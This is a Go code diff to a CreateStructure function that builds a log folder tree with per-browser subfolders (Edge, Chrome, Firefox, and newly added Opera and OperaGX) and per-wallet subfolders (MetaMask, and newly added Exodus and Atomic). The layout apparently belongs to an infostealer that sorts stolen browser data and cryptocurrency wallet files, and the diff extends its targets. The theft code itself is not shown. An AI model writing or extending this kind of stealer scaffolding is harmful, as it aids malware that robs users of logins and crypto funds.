@@ -24,22 +24,36 @@ func CreateStructure(logFolderPath string) {
 		}
 	}
 
-	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "edge")); os.IsNotExist(err) {
-		err := os.Mkdir(path.Join(logFolderPath, "browsers", "edge"), 0644)
+	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Edge")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Edge"), 0644)
 		if err != nil {
 			panic(err)
 		}
 	}
 
-	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "chrome")); os.IsNotExist(err) {
-		err := os.Mkdir(path.Join(logFolderPath, "browsers", "chrome"), 0644)
+	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Chrome")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Chrome"), 0644)
 		if err != nil {
 			panic(err)
 		}
 	}
 
-	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "firefox")); os.IsNotExist(err) {
-		err := os.Mkdir(path.Join(logFolderPath, "browsers", "firefox"), 0644)
+	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Firefox")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Firefox"), 0644)
+		if err != nil {
+			panic(err)
+		}
+	}
+
+	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Opera")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Opera"), 0644)
+		if err != nil {
+			panic(err)
+		}
+	}
+
+	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "OperaGX")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "browsers", "OperaGX"), 0644)
 		if err != nil {
 			panic(err)
 		}
@@ -68,6 +82,20 @@ func CreateStructure(logFolderPath string) {
 
 	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion")); os.IsNotExist(err) {
 		err := os.Mkdir(path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"), 0644)
+		if err != nil {
+			panic(err)
+		}
+	}
+
+	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "Exodus")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "wallets", "Exodus"), 0644)
+		if err != nil {
+			panic(err)
+		}
+	}
+
+	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "Atomic")); os.IsNotExist(err) {
+		err := os.Mkdir(path.Join(logFolderPath, "wallets", "Atomic"), 0644)
 		if err != nil {
 			panic(err)
 		}
